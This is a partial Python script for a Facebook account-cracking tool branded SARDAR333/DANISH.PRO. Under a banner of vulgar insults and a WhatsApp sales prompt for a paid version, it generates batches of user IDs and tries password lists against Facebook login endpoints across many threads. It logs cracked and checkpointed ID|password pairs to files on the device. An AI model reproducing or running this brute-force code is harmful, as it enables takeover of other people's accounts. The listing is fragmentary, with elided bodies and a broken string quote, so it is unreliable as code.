...
██   ██ ██   ██ ██  ██ ██ ██      ██ ██   ██ 
██████  ██   ██ ██   ████ ██ ███████ ██   ██ 
        😂  T3RII 🥀BH3N KO👉CH00DNY W9L9 D9NISH🤪
----------------------------------------------
 Author    : DANISH SARDAR333
 Github    : S9RD9R-BR9ND-420
 Facebook  : THE SYCO SARDAR333
 Tool Name : DANISH.PRO
 Type type : FREE
 Version   : 1.9.8
----------------------------------------------
 SARDAR333 Pro version 1.9.8
 For Haters: Tumhare Okat Nhi Mera Lund Chosny ke bcz i am your jija🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SARDAR333_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://github.com/S9RD9R-BR9ND-420/SARDAR333/tree/main);menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923463299102&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi SARDAR333 Sir, I Need To Buy Your Paid SARDAR333 PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SARDAR333.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SARDAR333:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SARDAR333.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SARDAR333-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SARDAR333=session.cookies.get_dict().keys()
                        if "c_user" in SARDAR333:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SARDAR333-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SARDAR333-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SARDAR333:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SARDAR333-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SARDAR333-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SARDAR333-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SARDAR333-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SARDAR333-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SARDAR333-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SARDAR333-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SARDAR333-OK] '+uid+' | '+pas+'\033[1;97m')
